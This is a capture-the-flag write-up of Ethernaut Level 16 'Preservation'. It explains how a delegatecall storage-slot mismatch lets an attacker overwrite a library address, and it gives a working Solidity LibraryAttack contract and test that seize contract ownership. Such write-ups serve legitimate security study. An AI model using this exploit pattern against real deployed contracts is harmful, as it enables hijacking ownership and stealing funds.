# Ethernaut Level 16 - Preservation

You can also read this [on my blog](https://wizzardhat.com/ethernaut-level-16-preservation/) 😎

## Objectives

- Become the owner of the `Preservation` contract.

## Contract Overview

The `Preservation` contract has two functions to set the time in the time zone libraries. It uses `delegatecall` to do so.

## Finding the weak spots

The `delegatecall` is state-preserving. It means that when delegating a call from contract A to contract B, the logic from contract B will be executed on the state of contract A. Because of that, you must ensure that the state variables are the same and declared in the same order in both contracts.

This is not the case in the `Preservation` contract. It has 5 state variables, and the `LibraryContract` has only 1. They are also in a different order.

```solidity
contract Preservation {
 address public timeZone1Library; // slot 0
    address public timeZone2Library; // slot 1
    address public owner; // slot 2
    uint256 storedTime; // slot 3
}

contract LibraryContract {
 uint256 storedTime; // slot 0
}
```

By making a `delegatecall` from the `Preservation` contract to the `LibraryContract` you are expecting it to modify the `storedTime` state variable. This won't happen. The variable at slot `0` in the `Preservation` contract will be modified with the content of `storedTime` from the library contract.

It means that the `timeZone1Library` address variable at slot `0` will be modified. We can possibly use it to change this address to point to a malicious library that will set the `owner` to our address.

## Potential attack scenario - hypothesis

*Eve is our attacker*

Eve can create a malicious `LibraryAttack` contract which will call the `setFirstTime` function on the `Preservation` contract. She will pass the address of her `LibraryAttack` contract as a parameter to the `delegatecall`. This way she will modify the slot `0` variable `address timeZone1LibraryAddress` to be equal to her attack contract. The second call that Eve will make will execute the `delegatecall` on her malicious `LibraryAttack`. This way she can modify the state of the `Preservation` contract to become the `owner` of this contract.

## Plan of the attack

1. Eve deploys the `LibraryAttack` contract.
2. She calls the `attack` function on the `LibraryAttack` contract.
1. This function makes two calls to the `Preservation` contract.
2. The first call executes a function `setFirstTime` with an address of `LibraryAttack` casted to `uint256`.
3. Because the first call modified the address of `timeZone1LibraryAddress`, the second call will execute a malicious `setFirstTime` function on the `LibraryAttack` contract.
3. The malicious `setFirstTime` contract changes the state variable `owner` to be the address of Eve.

Note that because the `setTimeSignature` is hardcoded in the `Preservation` contract for the `delegatecall` to use, it is necessary that the `LibraryAttack` contract has a function with the same signature.

## Proof of Concept - hypothesis test ✅

This is the attack contract.

```solidity
contract LibraryAttack {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // the state variables: owner and signature are not important
    // we only care about the first 3

    Preservation preservation;
    address eve;

    constructor(address _preservation) {
        preservation = Preservation(_preservation);
        eve = msg.sender;
    }

    function attack() public {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(address(eve))));
    }

    // a malicious setTime function
    function setTime(uint256 _owner) public {
        owner = address(uint160(uint256(_owner)));
    }
}
```

The first call to the `setFirstTime` function modifies the library address to the attack contract address.
The second call is executed on the `setTime` function in the `LibraryAttack` contract and set's the owner to Eve's address.

The unit test showcasing the exploit is as simple as this:

```solidity
LibraryAttack attackContract = new LibraryAttack(levelAddress);
attackContract.attack();
```

The hypothesis has been proven to be true.

## References

You can also read this [on my blog](https://wizzardhat.com/ethernaut-level-16-preservation/) 😎
